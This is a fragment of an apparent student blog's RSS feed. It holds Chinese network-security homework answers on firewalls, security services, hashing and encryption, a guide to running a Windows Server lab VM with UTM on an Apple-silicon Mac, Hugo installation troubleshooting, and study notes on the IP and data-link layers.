      <description>&lt;p&gt;得分：10/10&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;简述防火墙的定义&#xA;防火墙是位于两个(或多个)网络之间执行访问控制的软件和硬件系统，它根据访问控制规则对进出网络的数据流进行过滤。&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;防火墙对数据流的拒绝和丢弃有何区别?&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;当数据流被拒绝时，防火墙要向发送者回复一条消息，用ICMP包告知数据源数据包被拒绝的原因，提示发送者该数据流已被拒绝。&lt;/li&gt;&#xA;&lt;li&gt;当数据流被丢弃时，防火墙不会对这些数据包进行任何处理，也不会向发送者发送任何提示信息。丢弃数据包的做法加长了网络扫描所花费的时间，发送者只能等待回应直至通信超时。&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;简述数据包过滤器和状态防火墙。&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;数据包过滤器通过数据包的头部信息来判断是接受还是拒绝数据包，它并不查看数据包载荷中的应用数据。这种防火墙检查流经它的每个数据包，根据数据包本身所带的信息决定它的去留，而不用参考其他数据包的内容。&lt;/li&gt;&#xA;&lt;li&gt;状态防火墙会通过对流经的数据包的分析查找通信中的数据流，根据数据流的信息来帮助判断是否让数据包通行。数据流提供了数据包的上下文。状态防火墙有时还会检测一些常用协议的应用数据（虽然可以检测的数据量是有限的），通过这些数据来识别和跟踪相关的数据流。&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;与包过滤防火墙相比，应用代理防火墙有哪些特点？&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;在已有的安全模型中安全性较高。&lt;/li&gt;&#xA;&lt;li&gt;具有强大的认证功能。&lt;/li&gt;&#xA;&lt;li&gt;具有超强的日志功能。&lt;/li&gt;&#xA;&lt;li&gt;应用级网关防火墙的规则配置比较简单&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;在防火墙的典型部署中，堡垒主机是一个组织机构网络安全的中心主机，它应该具备哪些主要特征？&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;堡垒主机硬件平台运行较为安全的操作系统，成为可信任的系统。&lt;/li&gt;&#xA;&lt;li&gt;只有网络管理员认为必要的服务(代理和用户认证等)才会安装在堡垒主机上。&lt;/li&gt;&#xA;&lt;li&gt;当允许一个用户访问代理服务时，堡垒主机可能会要求进行额外认证。另外，每一个代理服务都可能需要相应的鉴别机制(Authentication)&lt;/li&gt;&#xA;&lt;li&gt;每一个代理都只能支持标准应用服务命令集中的一个子集。&lt;/li&gt;&#xA;&lt;li&gt;每一个代理只允许访问指定主机的通信，支持对通信进行详细的审计。&lt;/li&gt;&#xA;&lt;li&gt;每一个代理模块都是一个为网络安全设计的一个很小的软件包。&lt;/li&gt;&#xA;&lt;li&gt;代理之间相互独立。&lt;/li&gt;&#xA;&lt;li&gt;代理通常无需进行磁盘访问，不需要读取初始配置文件。这使得入侵者很难在主机上安装Trojan horse、sniffers或其他危险的文件。&lt;/li&gt;&#xA;&lt;li&gt;堡垒主机是一个组织机构网络安全的中心主机。&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;</description>
    </item>
    <item>
      <title>网络安全作业1</title>
      <link>//localhost:64783/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A1/</link>
      <pubDate>Thu, 26 Oct 2023 10:17:13 +0800</pubDate>
      <guid>//localhost:64783/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A1/</guid>
      <description>&lt;p&gt;得分：9/10&lt;/p&gt;&#xA;&lt;h2 id=&#34;第一章&#34;&gt;第一章&lt;/h2&gt;&#xA;&lt;p&gt;&lt;strong&gt;1. 如果你的网络服务器被黑客远程控制，列举3个可能被破坏的安全属性， 并解释理由。&lt;/strong&gt;&#xA;机密性：&#xA;理由：远程控制服务器后，黑客可以在未被授权的情况下获取个人信息、数据库记录等数据，导致数据泄露和隐私侵犯。&#xA;完整性：&#xA;理由：黑客远程服务器后，可以篡改服务器上的数据或者程序文件，修改网站内容、更改配置文件、插入恶意代码等。&#xA;可用性：&#xA;理由：黑客可能通过远程控制服务器发动拒绝服务攻击或直接禁用服务器上的关键服务和功能，导致服务器无法正常运行。&#xA;不可抵赖性：&#xA;理由：黑客可以使用服务器的访问权限执行恶意操作如数据篡改。如果服务器没有足够的安全措施来记录这些操作并确保其不可抵赖性，那么黑客可能会否认曾经执行过这些操作，导致难以追踪和证明责任。&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;2. 简述RFC2828安全服务的定义，例举Windows10系统的3种安全服务。&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;RFC2828定义了安全服务为一种由系统提供的对系统资源进行特殊保护的处理或通信服务，安全服务通过安全机制来实现安全策略。ITU-T（即X.800）定义了五种服务：身份认证、访问控制、数据保密、数据完整性、不可否认。&#xA;Windows 10操作系统中的三种安全服务：&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&lt;strong&gt;认证服务&lt;/strong&gt;：认证服务用于验证用户的身份，确保只有经过授权的用户能够访问系统或资源。在Windows 10中，用户必须提供正确的用户名和密码才能登录到系统。&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;访问控制服务&lt;/strong&gt;：访问控制服务用于确定哪些用户或实体具有权限访问特定资源或执行特定操作，并确保未经授权的访问被拒绝。在Windows 10中，访问控制服务管理文件和文件夹的权限，以及系统资源的访问权限。&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;加密服务&lt;/strong&gt;：加密服务用于将敏感数据转化为不可读的格式，以确保即使数据被未经授权的访问者获取，也无法理解其内容。只有具有正确密钥的用户才能解密数据。BitLocker是一个Windows 10中的工具，它可以加密整个硬盘或者某些部分，以保护数据免受丢失或盗取的威胁。&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;strong&gt;3 . 简述网络安全防护主要目标的“五不”。&lt;/strong&gt;&#xA;1. &lt;strong&gt;不泄露&lt;/strong&gt;（Non-Disclosure）：确保网络中的敏感信息和数据不会泄露给未经授权的用户或系统。&#xA;2. &lt;strong&gt;不破坏&lt;/strong&gt;（Non-Destruction）：防止网络系统和数据被破坏、损坏或篡改。&#xA;3. &lt;strong&gt;不拒绝&lt;/strong&gt;（Non-Repudiation）：确保在网络交互中的各种操作和交易都可以被证明，不容易被否认。&#xA;4. &lt;strong&gt;不中断&lt;/strong&gt;（Non-Interruption）：确保网络服务的持续可用性，防止由于攻击、故障或其他原因导致的网络服务中断。&#xA;5. &lt;strong&gt;不迟滞&lt;/strong&gt;（Non-Delay）：保障网络通信的实时性，防止因网络拥塞、延迟或其他问题导致通信延迟。&lt;/p&gt;&#xA;&lt;h2 id=&#34;第三章&#34;&gt;第三章&lt;/h2&gt;&#xA;&lt;p&gt;&lt;strong&gt;1. 在腾讯会议系统中，对称密码技术和公钥密码技术适合应用在哪几个阶段?说明理由。&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;会话加密阶段&lt;/strong&gt;：对称密码技术非常适合在会话加密阶段使用。一旦参与会议的用户建立了安全连接，可以使用对称加密算法来加密和解密数据通信。这是因为对称密码技术具有较高的加密和解密速度，使其非常适合对大量的音视频数据进行快速的加密和解密操作。&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;登录时身份验证和密钥交换阶段&lt;/strong&gt;：公钥密码技术通常用于安全地进行身份验证和密钥交换。在腾讯会议系统中，当用户首次登录时，可以使用公钥密码技术来验证其身份，并协商用于对称加密的会话密钥。&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;2.  简述散列函数MD5的碰撞问题。既然MD5存在碰撞问题，为何http://mirrors.ustc.edu.cn/ubuntu-releases/16.04/ 仍然给出MD5值作为完整性验证的依据。&lt;/strong&gt;&#xA;MD5的碰撞问题是指两个不同的输入数据在经过MD5算法处理后，得到了相同的散列值。这种情况被称为碰撞。&#xA;至于为什么仍然给出MD5值作为完整性验证的依据，可能是因为MD5是一个相对快速的散列函数，适用于快速验证大量文件的完整性。发行盘之后的系统安装和软件安装也有额外的安全验证程序。&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;3.  简述用RSA公钥算法实现数字签名的过程。&lt;/strong&gt;（这个问题回答的不好）&#xA;数字签名过程如下：&#xA;1. 发送者使用自己的私钥对消息进行加密，生成数字签名。&#xA;2. 发送者将消息和数字签名一起发送给接收者。&#xA;3. 接收者使用发送者的公钥对数字签名进行解密，得到消息的摘要。&#xA;4. 接收者使用相同的摘要算法对消息进行摘要处理，得到摘要。&#xA;5. 接收者比较两个摘要是否相同，如果相同，则说明消息没有被篡改过。&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;4. 用PGP加密某个文件，如果接收该加密文件的用户为1个，加密文件的大小为24kB；如果接收该加密文件的用户&#xA;为10个，请问加密文件的大小是原来的10倍(240kB)吗？为什么？&lt;/strong&gt;&#xA;答：加密文件的大小不会是原来的10倍，由于对称密钥是相对较短的，每个接收者的非对称密钥通常很小。因此，无论接收者数量是1个还是10个，对称密钥密文的总大小都不会显著增加，而文件内容加密只需一次，因此文件大小仍然是原始文件大小（24kB）加上对称密钥密文的大小的总和，而不会变成原来的10倍。&lt;/p&gt;</description>
    </item>
    <item>
      <title>网络安全实验配置</title>
      <link>//localhost:64783/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C%E9%85%8D%E7%BD%AE/</link>
      <pubDate>Thu, 26 Oct 2023 10:15:50 +0800</pubDate>
      <guid>//localhost:64783/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C%E9%85%8D%E7%BD%AE/</guid>
      <description>&lt;h1 id=&#34;网络安全实验配置&#34;&gt;网络安全实验配置&lt;/h1&gt;&#xA;&lt;p&gt;由于Mac的m系列芯片使用了arm架构与windows server镜像要求的x86架构不同，老师使用的virtual box和mac最常用的pd模拟器均只能进行同架构系统的模拟。于是乎我又查阅了资料，发现UTM可以在mac上进行不同架构的模拟（虽然很卡也很难用，终归是跑通了），以下是我的配置过程:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;UTM下载和安装&#xA;直接官网&lt;a href=&#34;https://mac.getutm.app&#34;&gt;UTM | Virtual machines for Mac&lt;/a&gt;下载并安装就好。&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;windows server镜像下载&#xA;这时候又出岔子了，老师提供的windows 2003不知道是不是太老了，UTM模拟不了。只能想办法换更新的windows sever2012&#xA;下载镜像地址：&lt;a href=&#34;https://hellowindows.cn&#34;&gt;HelloWindows.cn - 精校 完整 极致 Windows系统下载仓储站&lt;/a&gt;&#xA;注：需下载迅雷进行磁力链下载&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;wireshark的安装&#xA;直接官网&lt;a href=&#34;https://www.wireshark.org&#34;&gt;Wireshark · Go Deep&lt;/a&gt;下载安装就好&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;UTM和本地文件的共享&#xA;待补充&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;终于是能在mac上跑实验了，类目。&lt;/p&gt;&#xA;&lt;h2 id=&#34;utm下复制的主机互ping问题&#34;&gt;UTM下复制的主机互ping问题&lt;/h2&gt;&#xA;&lt;p&gt;本来像按照老师所给的内容配置了七个&lt;strong&gt;host-only&lt;/strong&gt;网络，网络是可以搭建起来的，但是server和client两个虚拟机之间无法互ping。&#xA;查阅了很多资料之后发现得设置成桥接模式，并把接口设置成&lt;code&gt;en0&lt;/code&gt;即可。如图：&#xA;&lt;img src=&#34;https://cdn.statically.io/gh/Anonymity-0/Picgo@note_picture/img/image.vu1ew1aysnk.webp&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>博客配置</title>
      <link>//localhost:64783/posts/%E5%8D%9A%E5%AE%A2%E9%85%8D%E7%BD%AE/</link>
      <pubDate>Wed, 18 Oct 2023 19:27:27 +0800</pubDate>
      <guid>//localhost:64783/posts/%E5%8D%9A%E5%AE%A2%E9%85%8D%E7%BD%AE/</guid>
      <description>&lt;p&gt;参考：&lt;a href=&#34;https://www.gohugo.cn/getting-started/quick-start/&#34;&gt;快速入门 | Hugo 中文网&lt;/a&gt;&lt;/p&gt;&#xA;&lt;h2 id=&#34;环境准备&#34;&gt;环境准备&lt;/h2&gt;&#xA;&lt;h3 id=&#34;安装hugo&#34;&gt;安装hugo&lt;/h3&gt;&#xA;&lt;p&gt;&lt;code&gt;brew install hugo&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;问题1&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Cloning into &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/Users/agq/Library/Caches/Homebrew/hugo--git&amp;#39;&lt;/span&gt;...&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;fatal: unable to access &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;https://github.com/gohugoio/hugo.git/&amp;#39;&lt;/span&gt;: Recv failure: Operation timed out&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;解决方法：关闭代理&lt;/p&gt;&#xA;&lt;p&gt;问题2&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Cloning into &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/Users/agq/Library/Caches/Homebrew/hugo--git&amp;#39;&lt;/span&gt;...&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;fatal: unable to access &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;https://github.com/gohugoio/hugo.git/&amp;#39;&lt;/span&gt;: Failed to connect to github.com port &lt;span style=&#34;color:#ae81ff&#34;&gt;443&lt;/span&gt; after &lt;span style=&#34;color:#ae81ff&#34;&gt;75008&lt;/span&gt; ms: Couldn&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;t connect to server&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;配置代理&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;git config --global http.proxy  127.0.0.1:7890&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;git config --global https.proxy  127.0.0.1:7890&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;git config --global http.proxy socks5 127.0.0.1:7890&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;git config --global https.proxy socks5 127.0.0.1:7890&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;问题3&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Error: Your Command Line Tools &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;CLT&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; does not support macOS 14.&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;It is either outdated or was modified.&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Please update your Command Line Tools &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;CLT&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; or delete it &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; no updates are available.&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Update them from Software Update in System Settings.&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;If that doesn&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;t show you any updates, run:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  sudo rm -rf /Library/Developer/CommandLineTools&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  sudo xcode-select --install&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Alternatively, manually download them from:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  https://developer.apple.com/download/all/.&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;You should download the Command Line Tools &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; Xcode 14.3.&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;解决方法：根据提示运行命令即可&lt;/p&gt;</description>
    </item>
    <item>
      <title>网络层</title>
      <link>//localhost:64783/posts/%E7%BD%91%E7%BB%9C%E5%B1%82/</link>
      <pubDate>Wed, 18 Oct 2023 19:25:30 +0800</pubDate>
      <guid>//localhost:64783/posts/%E7%BD%91%E7%BB%9C%E5%B1%82/</guid>
      <description>&lt;h1 id=&#34;网络层&#34;&gt;网络层&lt;/h1&gt;&#xA;&lt;p&gt;IP 即网际协议TCP/IP 的心脏是互联网层。这一层主要由 IP (Internet Protocol)和 ICMP (Internet Control Message Protocol)两个协议组成。&#xA;网络层的主要作用是“实现终端节点之间的通信”。这种终端节点之间的通信也叫 “点对点(end-to-end)通信”。&lt;/p&gt;&#xA;&lt;h3 id=&#34;主机和节点&#34;&gt;主机和节点&lt;/h3&gt;&#xA;&lt;p&gt;主机的定义应该是指“配置有I地址,但是不进行路由控制”的设备”。既配有IP地址又具有路由控制能力的设备叫做“路由器”,跟主机有所区别。而节点则是主机和路由器的统称。&lt;/p&gt;&#xA;&lt;h2 id=&#34;ip基础知识&#34;&gt;IP基础知识&lt;/h2&gt;&#xA;&lt;h3 id=&#34;ip地址&#34;&gt;IP地址&lt;/h3&gt;&#xA;&lt;p&gt;IP地址用于在“连接到网络中的所有主机中识别出进行通信的目标地址”&#xA;不论一台主机与哪种数据链路连接,其IP地址的形式都保持不变。以太网、无线局域网、PPP 等,都不会改变IP地址的形式。&#xA;而数据链路的MAC地址的形式不一定必须一致。&lt;/p&gt;&#xA;&lt;p&gt;在网桥或交换集线器等物理层或数据链路层数据包转发设备中,不需要设置IP地址”。因为这些设备只负责将IP 包转化为0、1 比特流转发或对数据链路帧的数据部分进行转发,而不需要应对IP 协议”&lt;/p&gt;&#xA;&lt;h3 id=&#34;路由控制&#34;&gt;路由控制&lt;/h3&gt;&#xA;&lt;p&gt;路由控制(Routing)是指将分组数据发送到最终目标地址的功能。&#xA;&lt;img src=&#34;https://cdn.statically.io/gh/Anonymity-0/Picgo@note_picture/img/image.m3wg17hb2ww.webp&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;Hop 译为中文叫“跳”。它是指网络中的一个区间。&#xA;一跳(1Hop)是指利用数据链路层以下分层的功能传输数据帧的一个区间。&#xA;以太网等数据链路中使用 MAC地址传输数据帧。此时的一跳是指从源MAC地址到目标MAC地址之间传输帧的区间。也就是说它是&lt;strong&gt;主机或路由器网卡不经其他路由器而能直接到达的相邻主机或路由器网卡之间的一个区间&lt;/strong&gt;。&lt;/p&gt;&#xA;&lt;h4 id=&#34;多跳路由&#34;&gt;多跳路由&lt;/h4&gt;&#xA;&lt;p&gt;IP 包正是在网络中一个个跳间被转发。因此 IP路由也叫做&lt;strong&gt;多跳路由&lt;/strong&gt;。在每一个区间内决定着包在下一跳被转发的路径。&#xA;&lt;img src=&#34;https://cdn.statically.io/gh/Anonymity-0/Picgo@note_picture/img/image.5wus42amy000.webp&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;多跳路由是指路由器或主机在转发IP 数据包时只指定下一个路由器或主机, 而不是将到最终目标地址为止的所有通路全都指定出来。因为每一个区间(跳) 在转发 IP数据包时会分别指定下一跳的操作,直至包达到最终的目标地址。&lt;/p&gt;&#xA;&lt;h4 id=&#34;路由控制表&#34;&gt;路由控制表&lt;/h4&gt;&#xA;&lt;p&gt;为了将数据包发给目标主机,所有主机都维护着一张路由控制表(Routing Table)。该表记录IP 数据在下一步应该发给哪个路由器。IP包将根据这个路由表在各个数据链路上传输。&#xA;&lt;img src=&#34;https://cdn.statically.io/gh/Anonymity-0/Picgo@note_picture/img/image.or7pvtf8400.webp&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;&#xA;&lt;h3 id=&#34;数据链路的抽象化&#34;&gt;数据链路的抽象化&lt;/h3&gt;&#xA;&lt;p&gt;IP 是实现多个数据链路之间通信的协议，对IP的上一层来说,不论底层数据链路使用以太网还是无线LAN 亦或是PPP,都将被一视同仁。&lt;/p&gt;&#xA;&lt;p&gt;不同数据链路有个最大的区别,就是它们各自的最大传输单位(MTU:Maximum Transmission Unit)不同。&lt;/p&gt;&#xA;&lt;p&gt;MTU 的值在以太网中是1500字节,在FDDI 中是4352字节,而ATM则为9180字节。IP 的上一层可能会要求传送比这些 MTU 更多字节的数据,因此必须在线路上传送比包长还要小的MTU。&lt;/p&gt;&#xA;&lt;p&gt;为了解决这个问题,IP 进行分片处理(IP Fragmentation)。顾名思义,所谓分片处理是指,将较大的IP 包分成多个较小的IP 包”即从 IP 的上次层看,它完全可以忽略数据包在途中的各个数据链路上的MTU,而只需要按照源地址发送的长度接收数据包。&#xA;IP 就是以这种方式抽象化了数据链路层,使得从上层更不容易看到底层网络构造的细节。&lt;/p&gt;&#xA;&lt;h3 id=&#34;面向无连接&#34;&gt;面向无连接&lt;/h3&gt;&#xA;&lt;p&gt;IP 面向无连接。即在发包之前,不需要建立与对端目标地址之间的连接。上层如果遇到需要发送给IP 的数据,该数据会立即被压缩成 IP包发送出去。&lt;/p&gt;</description>
    </item>
    <item>
      <title>数据链路层</title>
      <link>//localhost:64783/posts/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/</link>
      <pubDate>Wed, 18 Oct 2023 18:52:01 +0800</pubDate>
      <guid>//localhost:64783/posts/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/</guid>
      <description>&lt;h1 id=&#34;数据链路层&#34;&gt;数据链路层&lt;/h1&gt;&#xA;&lt;p&gt;数据链路是让互联计算机之间相互通信的一种协议,又指通信手段。&#xA;&lt;img src=&#34;https://cdn.statically.io/gh/Anonymity-0/Picgo@note_picture/Pasted-image-20231012105025.5kl644nt3rwg.webp&#34; alt=&#34;Pasted-image-20231012105025&#34;&gt;&lt;/p&gt;&#xA;&lt;h2 id=&#34;数据链路的段&#34;&gt;数据链路的段&lt;/h2&gt;&#xA;&lt;p&gt;数据链路的段是指一个被分割的网络。然而根据使用者不同,其含义也不尽相同。例如,引入中继器将两条网线相连组成一个网络。&#xA;这种情况下有两条数据链路:&#xA;◎从网络层的概念看,它是一个网络(逻辑上)一即,从网络层的立场出发,这两条网线组成一个段。&#xA;◎从物理层的概念看,两条网线分别是两个物体(物理上)一即, 从物理层的观.点出发,一条网线是一个段。&#xA;&lt;img src=&#34;https://cdn.statically.io/gh/Anonymity-0/Picgo@note_picture/Pasted-image-20231012081420.5ysseb4pnshs.webp&#34; alt=&#34;Pasted-image-20231012081420&#34;&gt;&lt;/p&gt;&#xA;&lt;h2 id=&#34;网络拓扑&#34;&gt;网络拓扑&lt;/h2&gt;&#xA;&lt;p&gt;网络的连接和构成的形态称沟网络拓扑(Topology)。网络拓扑包括总线型、环型、星型、网状型等。拓扑一词不仅用于直观可见的配线方式上,也用于逻辑上网络的组成结构。两者有时可能会不一致。而目前实际的网络都是由这些简单的拓扑结构错综复杂地组合而成的。&#xA;&lt;img src=&#34;https://cdn.statically.io/gh/Anonymity-0/Picgo@note_picture/Pasted-image-20231012081544.7czlpvdg2800.webp&#34; alt=&#34;Pasted-image-20231012081544&#34;&gt;&lt;/p&gt;&#xA;&lt;h2 id=&#34;mac&#34;&gt;MAC&lt;/h2&gt;&#xA;&lt;p&gt;MAC地址用于识别数据链路中互连的节点。&#xA;&lt;img src=&#34;https://cdn.statically.io/gh/Anonymity-0/Picgo@note_picture/Pasted-image-20231012081801.6d7w2ss3lji8.webp&#34; alt=&#34;Pasted-image-20231012081801&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;MAC 地址长48 比特。在使用网卡(NIC)的情况下, MAC地址一般会被烧人到 ROM 中。因此,任何一个网卡的MAC地址都是唯一的,在全世界都不会有重复”。&#xA;注：&#xA;例外情况—MAC地址不一定是唯一的在全世界,MAC地址也并不总是唯一的。实际上,即使 MAC地址相同,只要不是同属一个数据链路就不会出现问题。&#xA;例如,人们可以在微机板上自由设置自己的MAC地址。再例如,一台主机上如果启动多个虚拟机,由于没有硬件的网卡只能由虚拟软件自己设定 MAC地址给多个虚拟网卡,这时就很难保证所生成的MAC地址是独一无二的了。&#xA;但是,无论哪个协议成员通信设备,设计前提都是 MAC地址的唯一性。这也可以说是网络世界的基本准则。&#xA;&lt;img src=&#34;https://cdn.statically.io/gh/Anonymity-0/Picgo@note_picture/Pasted-image-20231012091135.23u12hdiijgg.webp&#34; alt=&#34;Pasted-image-20231012091135&#34;&gt;&lt;/p&gt;&#xA;&lt;h3 id=&#34;根据-mac地址转发&#34;&gt;根据 